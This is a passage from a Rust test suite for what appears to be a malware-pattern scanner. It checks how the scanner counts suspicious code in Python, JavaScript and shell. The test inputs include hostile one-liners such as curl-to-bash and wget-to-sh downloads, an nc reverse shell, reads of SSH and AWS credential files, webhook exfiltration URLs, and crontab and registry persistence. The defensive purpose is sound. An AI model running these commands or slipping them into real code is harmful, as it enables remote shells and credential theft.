            3
        );
        assert_eq!(
            py("from subprocess import Popen\nPopen(['x'])\n")[PROC_EXEC],
            2
        );
        assert_eq!(py("import pty\npty.spawn('/bin/sh')\n")[PROC_EXEC], 1);
    }

    #[test]
    fn proc_exec_python_false_positives() {
        // Comments, strings and unrelated methods do not count.
        assert_eq!(
            py("# subprocess.run(x)\nx = 'os.system'\nself.system()\n")[PROC_EXEC],
            0
        );
        assert_eq!(py("def system(self):\n    pass\n")[PROC_EXEC], 0);
    }

    #[test]
    fn proc_exec_js() {
        let c = js("const cp = require('child_process');\ncp.exec('ls');\ncp.execSync('id');\n");
        assert_eq!(c[PROC_EXEC], 3);
        // `exec` without child_process (RegExp.prototype.exec) does not count.
        assert_eq!(js("const m = /a/.exec(s);\n")[PROC_EXEC], 0);
        assert_eq!(js("// require('child_process')\n")[PROC_EXEC], 0);
        assert_eq!(
            js("import { spawn } from 'node:child_process'; spawn('x');")[PROC_EXEC],
            2
        );
    }

    #[test]
    fn dyn_code_python() {
        assert_eq!(py("eval(x)\nexec(code)\n__import__('os')\n")[DYN_CODE], 3);
        assert_eq!(
            py("import importlib\nimportlib.import_module(name)\n")[DYN_CODE],
            1
        );
        // re.compile and method calls named exec are not dynamic code.
        assert_eq!(
            py("import re\nre.compile('x')\ncursor.exec(q)\n# eval(x)\n")[DYN_CODE],
            0
        );
    }

    #[test]
    fn dyn_code_js() {
        assert_eq!(js("eval(atob(s));\nnew Function('a', b)();\n")[DYN_CODE], 2);
        assert_eq!(
            js("require(path.join(__dirname, x));\nrequire('fs');\n")[DYN_CODE],
            1
        );
        assert_eq!(
            js("const vm = require('vm'); vm.runInNewContext(code);\n")[DYN_CODE],
            1
        );
        assert_eq!(js("/* eval(x) */ const s = 'eval(x)';\n")[DYN_CODE], 0);
    }

    #[test]
    fn network_python_and_js() {
        assert_eq!(
            py("import requests\nrequests.post(u, data=d)\n")[NETWORK],
            2
        );
        assert_eq!(py("import os, socket\ns = socket.socket()\n")[NETWORK], 2);
        assert_eq!(
            py("from urllib.request import urlopen\nurlopen(u)\n")[NETWORK],
            2
        );
        // A local variable named requests that is never dereferenced does not count.
        assert_eq!(py("requests = []\n# import requests\n")[NETWORK], 0);
        assert_eq!(
            js("const https = require('https'); https.get(u);\nfetch(u);\n")[NETWORK],
            3
        );
        assert_eq!(js("const x = 'https';\n")[NETWORK], 0);
    }

    #[test]
    fn decode_obf_python_and_js() {
        assert_eq!(
            py("import base64\nexec(base64.b64decode(s))\n")[DECODE_OBF],
            1
        );
        assert_eq!(
            py("import zlib, marshal\nzlib.decompress(b)\nmarshal.loads(b)\n")[DECODE_OBF],
            2
        );
        assert_eq!(
            py("codecs.decode(s, 'rot13')\nbytes.fromhex(h)\n")[DECODE_OBF],
            3
        );
        assert_eq!(
            js("Buffer.from(s, 'base64').toString();\natob(x);\nString.fromCharCode(1);\n")
                [DECODE_OBF],
            3
        );
        assert_eq!(js("Buffer.from(s, 'utf8');\n")[DECODE_OBF], 0);
    }

    #[test]
    fn env_access() {
        assert_eq!(
            py("import os\nos.environ['X']\nos.getenv('Y')\n")[ENV_ACCESS],
            2
        );
        assert_eq!(py("from os import environ\n")[ENV_ACCESS], 0);
        assert_eq!(js("const t = process.env.NPM_TOKEN;\n")[ENV_ACCESS], 1);
        assert_eq!(js("// process.env\n")[ENV_ACCESS], 0);
    }

    #[test]
    fn secret_paths() {
        let c = py("p = os.path.join(home, '.ssh', 'id_rsa')\nq = '~/.aws/credentials'\n");
        assert_eq!(c[SECRET_PATHS], 3);
        assert_eq!(js("fs.readFileSync(home + '/.npmrc');\n")[SECRET_PATHS], 1);
        // A Discord webhook is an exfil endpoint, not a token-store path.
        let w = js("const u = 'https://discord.com/api/webhooks/1/abc';\n");
        assert_eq!(w[SECRET_PATHS], 0);
        assert_eq!(w[EXFIL_ENDPOINT], 1);
        assert_eq!(
            js("const d = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\n")
                [SECRET_PATHS],
            2
        );
        assert_eq!(py("# read ~/.ssh/id_rsa\n")[SECRET_PATHS], 0);
    }

    #[test]
    fn persistence() {
        assert_eq!(
            py("open(os.path.expanduser('~/.bashrc'), 'a')\n")[PERSISTENCE],
            1
        );
        assert_eq!(
            sh("(crontab -l; echo '* * * * * x') | crontab -\n")[PERSISTENCE],
            2
        );
        assert_eq!(
            js("const k = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\n")
                [PERSISTENCE],
            1
        );
        assert_eq!(sh("schtasks /create /tn x\n")[PERSISTENCE], 1);
    }

    #[test]
    fn recon() {
        assert_eq!(py("import platform, socket, getpass\nplatform.node()\nsocket.gethostname()\ngetpass.getuser()\n")[RECON], 3);
        assert_eq!(
            js("const os = require('os'); os.hostname(); os.userInfo(); os.networkInterfaces();\n")
                [RECON],
            3
        );
        assert_eq!(sh("whoami; uname -a\n")[RECON], 2);
        assert_eq!(js("const hostname = cfg.hostname;\n")[RECON], 0);
    }

    #[test]
    fn download_exec() {
        assert_eq!(
            sh("curl -fsSL https://x.example/a.sh | bash\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(
            py("os.system('wget -qO- http://x | sh')\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(sh("powershell -enc SQBFAFgA\n")[DOWNLOAD_EXEC], 1);
        assert_eq!(
            sh("certutil -urlcache -split -f http://x/a.exe a.exe\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(sh("chmod +x ./payload && ./payload\n")[DOWNLOAD_EXEC], 1);
        assert_eq!(
            sh("# curl x | sh\ncurl -o out.tgz https://x\n")[DOWNLOAD_EXEC],
            0
        );
        // Fetch, write and execute in the same Python file.
        let c = py("import urllib.request, subprocess\nurllib.request.urlretrieve(u, 'a')\nopen('a','wb').write(d)\nsubprocess.call(['a'])\n");
        assert_eq!(c[DOWNLOAD_EXEC], 1);
    }

    #[test]
    fn exfil_ip_url() {
        let c = py("requests.post('https://webhook.site/abc', data=x)\nu = 'http://45.13.1.9:8080/x'\nv = 'http://127.0.0.1:8000'\n");
        assert_eq!(c[EXFIL_ENDPOINT], 1);
        assert_eq!(c[IP_URL], 1);
        assert_eq!(c[URL], 3);
        assert_eq!(
            js("fetch('https://api.telegram.org/bot1/sendMessage');\n")[EXFIL_ENDPOINT],
            1
        );
        assert_eq!(py("# see https://pastebin.com/x\n")[URL], 0);
        assert_eq!(js("const s = 'toast.show';\n")[EXFIL_ENDPOINT], 0);
    }

    #[test]
    fn file_write() {
        assert_eq!(
            py("open('x', 'w')\nopen('y')\nopen(p, mode='ab')\nopen(p, 'rb')\n")[FILE_WRITE],
            2
        );
        assert_eq!(
            py("import shutil, os\nshutil.copy(a, b)\nos.chmod(p, 0o755)\nPath(p).write_text(s)\n")
                [FILE_WRITE],
            3
        );
        assert_eq!(
            js("fs.writeFileSync(p, d); fs.createWriteStream(p);\n")[FILE_WRITE],
            2
        );
        assert_eq!(sh("echo x > /tmp/a\nls > /dev/null 2>&1\n")[FILE_WRITE], 1);
    }

    #[test]
    fn crypto_wallet() {
        assert_eq!(
            js("const p = path.join(home, 'Exodus', 'exodus.wallet');\n")[CRYPTO_WALLET],
            2
        );
        assert_eq!(
            py("addr = '0x52908400098527886E0F7030069857D2E4169EE7'\n")[CRYPTO_WALLET],
            1
        );
        assert_eq!(
            py("addr = '1BoatSLRHtKNngkdXEeobR76b53LETtpyT'\n")[CRYPTO_WALLET],
            1
        );
        assert_eq!(py("x = 'hello world'\n")[CRYPTO_WALLET], 0);
    }

    #[test]
    fn shell_specific_rules() {
        let c = sh("nc -e /bin/sh 10.0.0.1 4444\neval \"$X\"\necho $env:USERNAME\n");
        assert_eq!(c[NETWORK], 1);
        assert_eq!(c[DYN_CODE], 1);
        assert_eq!(c[ENV_ACCESS], 1);
        assert_eq!(sh("node -e \"require('x')\"\n")[DYN_CODE], 1);
    }

    #[test]
    fn statistics() {
        let fa = analyze(
            "x = '\\x41\\x42'\ny = 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo='\n_0x1a2b = 1\n",
            Lang::Python,
        );
        assert_eq!(fa.hex_escapes, 2);
        assert_eq!(fa.n_lines, 3);
        assert_eq!(fa.longest_b64_run, 36);
        assert_eq!(fa.n_obf_idents, 1);
        assert!(fa.max_str_entropy > 4.0);
        let long = "a".repeat(1200);
        let fa = analyze(&format!("x = 1\ny = '{long}'\n"), Lang::Python);
        assert_eq!(fa.long_lines, 1);
        assert_eq!(fa.max_line_len, 1206);
    }

    #[test]
    fn evidence_lines() {
        let fa = analyze("a = 1\n\nimport os\nos.system('id')\n", Lang::Python);
        assert!(fa.hits.contains(&(PROC_EXEC, 4)));
        let fa = analyze("echo hi\n\ncurl http://x | sh\n", Lang::Shell);
        assert!(fa.hits.contains(&(DOWNLOAD_EXEC, 3)));
        let fa = analyze(
            "x = '''line1\nline2 https://webhook.site/x'''\n",
            Lang::Python,
        );
        assert!(fa.hits.contains(&(EXFIL_ENDPOINT, 2)));
    }

    #[test]
    fn js_relative_imports() {
        let fa = analyze(
            "const a = require('./lib/a');\nimport b from '../b.js';\nrequire('fs');\n",
            Lang::Js,
        );
        assert_eq!(fa.relative_imports, vec!["./lib/a", "../b.js"]);
    }
}
